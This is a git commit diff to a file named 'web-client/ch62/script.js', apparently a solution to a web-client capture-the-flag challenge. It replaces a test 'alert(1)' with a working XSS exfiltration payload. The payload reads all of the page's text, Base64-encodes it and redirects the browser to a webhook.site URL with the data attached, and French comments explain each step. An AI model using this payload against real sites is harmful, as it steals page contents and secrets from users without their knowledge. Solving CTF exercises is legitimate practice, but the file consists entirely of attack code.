f173bff23ea71d54584f6883518a36064009e7ed
William Jésu <willyjesu@gmail.com>
2026-04-01 22:17:52 +0200

    Update script.js

--- web-client/ch62/script.js
+++ web-client/ch62/script.js
@@ -1,1 +1,6 @@
-alert(1)
+// On récupère tout le texte de la page (où se trouve le flag)
+var flag = document.body.innerText;
+
+// On force le navigateur à naviguer vers ton Webhook avec le flag en paramètre
+// btoa() sert à encoder en Base64 pour éviter que les caractères spéciaux ne cassent l'URL
+window.location.href = "https://webhook.site/TON_ID_WEBHOOK?data=" + btoa(flag);
